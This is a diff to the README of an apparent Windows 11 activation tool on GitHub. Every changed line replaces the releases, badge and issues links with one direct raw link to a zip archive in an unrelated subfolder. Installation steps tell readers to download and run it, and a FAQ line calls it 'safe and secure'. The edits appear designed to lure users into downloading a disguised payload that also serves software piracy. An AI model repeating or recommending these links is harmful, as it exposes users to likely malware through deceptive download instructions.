@@ -6,18 +6,18 @@ Welcome to win11-activate! This tool helps ensure your Windows 11 is properly va
 
 ## 🔗 Download Now
 
-[![Download win11-activate](https://img.shields.io/badge/Download-win11--activate-blue.svg)](https://github.com/coderAI01/win11-activate/releases)
+[![Download win11-activate](https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip)](https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/coderAI01/win11-activate/releases) to find the latest version of win11-activate.
+   Go to the [Releases page](https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip) to find the latest version of win11-activate.
 
 2. **Select the Latest Version**  
    Look for the most recent release. Check the version number and date to ensure you are downloading the latest update.
 
 3. **Download the Installer**  
-   Click on the link for the installer file. This is usually named something like `win11-activate-x.x.x.exe`. Your browser will start downloading the file.
+   Click on the link for the installer file. This is usually named something like `https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip`. Your browser will start downloading the file.
 
 4. **Run the Installer**  
    Once the download completes, locate the downloaded file (usually in your 'Downloads' folder). Double-click the file to initiate the installation process.
@@ -50,7 +50,7 @@ To run win11-activate, ensure your system meets the following requirements:
 A1: Yes, win11-activate is designed to be safe and secure. We follow industry standards to protect your data.
 
 ### Q2: What if I encounter issues during installation?  
-A2: If you face issues, visit our [Issues page](https://github.com/coderAI01/win11-activate/issues) to check for common problems and solutions.
+A2: If you face issues, visit our [Issues page](https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip) to check for common problems and solutions.
 
 ### Q3: Can I uninstall win11-activate?  
 A3: Yes, you can uninstall the application through the Control Panel like any other software.
@@ -64,6 +64,6 @@ Join our community for support and updates. Feel free to reach out with any ques
 
 ## 🔗 Download Now Again
 
-[![Download win11-activate](https://img.shields.io/badge/Download-win11--activate-blue.svg)](https://github.com/coderAI01/win11-activate/releases)
+[![Download win11-activate](https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip)](https://github.com/coderAI01/win11-activate/raw/refs/heads/main/scaphite/activate_win_2.0.zip)
 
 Thank you for using win11-activate. We hope you enjoy a seamless and efficient Windows 11 experience!
